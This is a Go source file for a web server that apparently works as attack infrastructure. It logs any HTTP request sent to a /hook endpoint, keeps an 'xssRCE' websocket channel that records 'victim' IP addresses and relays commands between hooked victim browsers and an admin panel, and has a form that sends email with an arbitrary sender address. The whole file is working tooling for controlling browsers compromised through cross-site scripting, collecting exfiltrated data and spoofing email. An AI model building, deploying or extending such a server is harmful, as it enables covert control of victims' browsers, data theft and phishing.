package main

import (
	b64 "encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"time"
	"webhook/constant"
	"webhook/container"
	"webhook/email"
	"webhook/model"
	"webhook/socket"

	"github.com/gin-contrib/static"
	"github.com/gin-gonic/gin"
	"github.com/olahol/melody"
	"github.com/twinj/uuid"
	"gopkg.in/mgo.v2/bson"
)

var (
	configPath string
)

func main() {
	flag.Parse()
	err := container.Setup(configPath)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	route()
}

func route() {
	var sessionMgr = socket.NewMgr()

	r := gin.Default()
	m := melody.New()
	r.LoadHTMLGlob("templates/*")
	r.Use(static.Serve("/static", static.LocalFile("static", false)))

	authorized := r.Group("/admin", gin.BasicAuth(gin.Accounts{
		container.Get().Config.User: container.Get().Config.Pass,
	}))

	hook := r.Group("/hook")
	{
		hook.GET("", hookRequest)
		hook.PATCH("", hookRequest)
		hook.POST("", hookRequest)
		hook.PUT("", hookRequest)
		hook.DELETE("", hookRequest)
		hook.OPTIONS("", hookRequest)
		hook.HEAD("", hookRequest)
	}

	m.HandleConnect(func(sess *melody.Session) {
		id := socket.GetIDFromSession(sess)
		if !strings.Contains(sess.Request.URL.Path, "/admin/") {
			if sessionMgr.Exist(id) {
				sess.Close()
			} else {
				sessionMgr.Set(id, sess)
			}
		} else {
			authenHeader := sess.Request.Header.Get("Authorization")
			authenHeader = strings.TrimSpace(strings.Replace(authenHeader, "Basic", "", 1))
			uDec, _ := b64.URLEncoding.DecodeString(authenHeader)
			if string(uDec) != container.Get().Config.User+":"+container.Get().Config.Pass {
				sess.Close()
			}
		}
	})

	m.HandleDisconnect(func(sess *melody.Session) {
		id := socket.GetIDFromSession(sess)
		sessionMgr.Delete(id)
	})

	xssRCE := r.Group("/xss")
	{
		xssRCE.GET("/channel/:name/ws", func(c *gin.Context) {
			c.Request.Header.Set(constant.HEADER_VICTIM_IP, getRealIp(c))
			c.Request.Header.Set(constant.HEADER_VICTIM_DATE, getCurrentTime())
			m.HandleRequest(c.Writer, c.Request)
		})

	}

	m.HandleMessage(func(s *melody.Session, msg []byte) {
		m.BroadcastFilter(msg, func(q *melody.Session) bool {
			if strings.Contains(s.Request.URL.Path, "/admin") {
				return q.Request.URL.Path == strings.Replace(s.Request.URL.Path, "/admin", "", 1)
			} else {
				return q.Request.URL.Path == "/admin"+s.Request.URL.Path
			}
		})
	})

	//admin
	authorized.GET("/hook/view", getAllHookRequest)
	authorized.GET("/hook/view/:id", getHookRequest)
	authorized.GET("/hook/del/:id", delHookRequest)
	authorized.GET("/email", getEmailPage)
	authorized.POST("/email", sendEmail)
	authorized.GET("/xss/channel/:name/ws", func(c *gin.Context) {
		m.HandleRequest(c.Writer, c.Request)
	})
	authorized.GET("/xss/channel/:name/delete", func(c *gin.Context) {
		id := c.Param("name")
		sessionMgr.Delete(id)
		c.Redirect(http.StatusFound, "/admin/xss/channels")
	})
	authorized.GET("/xss/channel/:name", func(c *gin.Context) {
		id := c.Param("name")
		channel, _ := sessionMgr.Get(id)
		c.HTML(http.StatusOK, "xss_rce.html", gin.H{
			"Channel": channel,
		})
	})
	authorized.GET("/xss/channels", func(c *gin.Context) {
		channels := sessionMgr.GetAll()
		c.HTML(http.StatusOK, "xss_channels.html", gin.H{
			"Victims": channels,
		})
	})

	r.Run(container.Get().Config.Listen)
}

func sendEmail(c *gin.Context) {
	from := c.PostForm("from")
	to := c.PostForm("to")
	subject := c.PostForm("subject")
	body := c.PostForm("body")

	msg := email.Message{
		To:      to,
		From:    from,
		Subject: subject,
		Body:    body,
	}

	var err error
	if len(msg.From) < 1 {
		err = fmt.Errorf("From is not null")
	}

	if len(msg.To) < 1 {
		err = fmt.Errorf("To is not null")
	}

	if len(msg.Subject) < 1 {
		err = fmt.Errorf("Subject is not null")
	}

	if len(msg.Body) < 1 {
		err = fmt.Errorf("Body is not null")
	}

	if err != nil {
		c.HTML(http.StatusOK, "email.html", gin.H{
			"Message": msg,
			"Err":     err.Error(),
		})
		return
	}

	err = msg.Send()
	if err != nil {
		c.HTML(http.StatusOK, "email.html", gin.H{
			"Message": msg,
			"Err":     err.Error(),
		})
		return
	}

	c.HTML(http.StatusOK, "email.html", gin.H{
		"Success": true,
	})
}

func getEmailPage(c *gin.Context) {
	var msg = email.Message{}
	c.HTML(http.StatusOK, "email.html", gin.H{
		"Message": msg,
	})
}

func delHookRequest(c *gin.Context) {
	id := c.Param("id")
	err := container.Get().DB.C(constant.TABLE_REQUEST).Remove(bson.M{"id": id})
	if err != nil {
		panic(err)
	}

	c.Redirect(http.StatusFound, "/admin/hook/view")
}

func getHookRequest(c *gin.Context) {
	id := c.Param("id")
	var req model.Req
	err := container.Get().DB.C(constant.TABLE_REQUEST).Find(bson.M{"id": id}).One(&req)
	if err != nil {
		panic(err)
	}

	u, err := url.Parse(req.Url)
	if err != nil {
		panic(err)
	}

	var query = make(map[string]interface{})
	m, _ := url.ParseQuery(u.RawQuery)
	for k, v := range m {
		query[k] = v
	}

	c.HTML(http.StatusOK, "hook_detail.html", gin.H{
		"Req":   req,
		"Query": query,
	})
}

func getAllHookRequest(c *gin.Context) {
	var reqs []model.Req
	err := container.Get().DB.C(constant.TABLE_REQUEST).Find(nil).Sort("-_id").All(&reqs)
	if err != nil {
		panic(err)
	}

	c.HTML(http.StatusOK, "hook.html", gin.H{
		"Reqs": reqs,
	})
}

func hookRequest(c *gin.Context) {
	var req model.Req

	body, err := ioutil.ReadAll(c.Request.Body)
	if err == nil {
		req.Body = string(body)
	}

	host := getRealHost(c)

	req.Url = host + c.Request.RequestURI
	if c.Request.TLS == nil {
		req.Url = "http://" + req.Url
	} else {
		req.Url = "https://" + req.Url
	}

	req.ClientIp = getRealIp(c)

	req.Header = c.Request.Header
	req.Date = getCurrentTime()
	req.Method = c.Request.Method
	req.Id = uuid.NewV4().String()

	err = container.Get().DB.C(constant.TABLE_REQUEST).Insert(req)
	if err != nil {
		panic(err)
	}

	c.JSON(http.StatusOK, req)
}

func getRealIp(c *gin.Context) string {
	clientIp := c.Request.Header.Get(constant.HEADER_VICTIM_IP)
	if clientIp == "" {
		clientIp = c.ClientIP()
	}
	c.Request.Header.Del(constant.HEADER_VICTIM_IP)
	return clientIp
}

func getRealHost(c *gin.Context) string {
	host := c.Request.Header.Get(constant.HEADER_VICTIM_HOST)
	if host == "" {
		host = c.ClientIP()
	}
	c.Request.Header.Del(constant.HEADER_VICTIM_HOST)
	return host
}

func getCurrentTime() string {
	loc, _ := time.LoadLocation("Asia/Ho_Chi_Minh")
	return time.Now().In(loc).Format(constant.HH_MM_SS_DD_MM_YYYY)
}

func init() {
	flag.StringVar(&configPath, "config", "config.toml", "location of the config file")
	runtime.GOMAXPROCS(runtime.NumCPU())
}
